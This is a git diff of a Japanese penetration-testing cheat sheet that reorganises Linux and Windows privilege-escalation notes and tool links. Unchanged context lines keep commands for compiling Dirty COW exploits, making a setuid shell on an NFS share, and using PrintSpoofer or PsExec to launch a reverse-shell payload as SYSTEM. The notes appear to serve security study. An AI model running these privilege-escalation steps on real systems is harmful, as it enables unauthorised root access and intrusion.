@@ -1741,12 +1741,11 @@ chmod +xs /tmp/nfs/shell.elf
 ```
 uname -a
 ```
-カーネルエクスプロイトの検出  
-linux-exploit-suggester2:  
+linux-exploit-suggester2による自動列挙:
 https://github.com/jondonas/linux-exploit-suggester-2
 #### Dirtycow
 ・40839.c(dirty.c)
-パスワードを自身で入力して、firefaltというアカウントを作成する
+パスワードを自身で入力して、firefaltというアカウントを作成する。
 ```
 gcc -pthread dirty.c -o dirty -lcrypt
 chmod 755 dirty
@@ -1763,7 +1762,7 @@ firefart:fijI1lDcvwk7k:0:0:pwned:/root:/bin/bash
 su firefart
 ```
 
-・40616.c(cowroot.c)
+・40616.c(cowroot.c)  
 実行するだけでrootになれる
 ```
 gcc cowroot.c -o cowroot -pthread
@@ -1773,7 +1772,7 @@ gcc cowroot.c -o cowroot -pthread
 * root@box:/root/cow# id
 * uid=0(root) gid=1000(foo) groups=1000(foo)
 ```
-・c0w
+・c0w  
 https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54
 ```
 gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
@@ -1783,7 +1782,7 @@ gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
 /usr/bin/passwd
 ```
 
-#### ファイルの検索
+### ファイルの検索
 ```
 find / -name <ファイル名> -type f 2>>/dev/null
 ```
@@ -1793,15 +1792,20 @@ find / -name <ファイル名> -type f 2>>/dev/null
 - 2>>/dev/null...全てのエラーを破棄
 
 
+
+### 実行中のプロセスを確認
+```
+ps aux
+```
+pspyによる実行中プロセスの確認:
+https://github.com/DominicBreuker/pspy  
+ps auxコマンドでは確認できない定期的にUID=0(root権限)で実行されているスクリプトを確認することができる。  
+馴染みのないプロセスが動作している場合、そのプロセスが権限昇格の鍵になる場合もあるため、要チェック。  
+
 ### 開いているポートの確認
 ```
 netstat -tulpn
 netstat -an(linux以外)
-```
-
-### 実行中のプロセスを確認
-```
-ps -aux
 ```
 
 ### *.sh実行時に「bad interpreter: No such file or directory」が表示されたら
@@ -1810,12 +1814,7 @@ ps -aux
 sed -i 's/\r//' *.sh
 ```
 
-### pspy
-ps auxコマンドでは確認できない定期的にUID=0(root権限)で実行されているスクリプトを確認することができる。  
-馴染みのないプロセスが動作している場合、そのプロセスが権限昇格の鍵になる場合もあるため、要チェック。  
-
-
-#### ユーザを指定してコマンドを実行
+### ユーザを指定してコマンドを実行
 ```
 www-data@bashed:/$ sudo -l
 Matching Defaults entries for www-data on bashed:
@@ -1829,7 +1828,7 @@ scriptmanager@bashed:/$ whoami
 scriptmanager
 ```
 
-#### tools
+#### PrivEsc - Enum tools(Linux)
 linpease.sh:  
 https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite  
 
@@ -1839,8 +1838,8 @@ https://github.com/rebootuser/LinEnum
 php-reverse-shell:  
 https://github.com/pentestmonkey/php-reverse-shell   
 
-privilege-escalation-awesome-scripts-suite:  
-https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite  
+PEASS-ng(linpeas.sh):  
+https://github.com/carlospolop/PEASS-ng  
 
 pspy:  
 https://github.com/DominicBreuker/pspy  
@@ -2449,11 +2448,8 @@ PSExec64.exe -i -u "nt authority\local service" C:\Windows\Temp\reverse.exe
 ```
 PrintSpoofer.exe -c "C:\Windows\Temp\reverse.exe(reverse shellペイロードが配置されているパス)" -i
 ```
-
-### Privilege Escalation Scripts
-
-
-
+PrintSpoofer:  
+https://github.com/itm4n/PrintSpoofer.git
 ### evlilwinrm(5985)
 WinRM(Windowsリモート管理)を利用したペンテスト特化ツール。  
 5985ポートが空いている時に使用。
@@ -2538,4 +2534,30 @@ Done
 
 ![](./image/2021-05-06-17-49-20.png)
 
-### tools
+### PrivEsc Tools(Windows)
+Windows Sysinternals:
+https://docs.microsoft.com/en-us/sysinternals/  
+
+PEASS-ng(winpeas.bat):  
+https://github.com/carlospolop/PEASS-ng  
+
+PowerSploit(PowerUp.ps1):  
+https://github.com/PowerShellMafia/PowerSploit.git
+
+nishang:  
+https://github.com/samratashok/nishang.git
+
+creddump7:  
+https://github.com/Tib3rius/creddump7
+
+juicy-potato:  
+https://github.com/ohpe/juicy-potato.git
+
+RoguePotato:  
+https://github.com/antonioCoco/RoguePotato.git
+
+PrintSpoofer:  
+https://github.com/itm4n/PrintSpoofer.git
+
+Windows-kernel-exploits:  
+https://github.com/SecWiki/windows-kernel-exploits.git
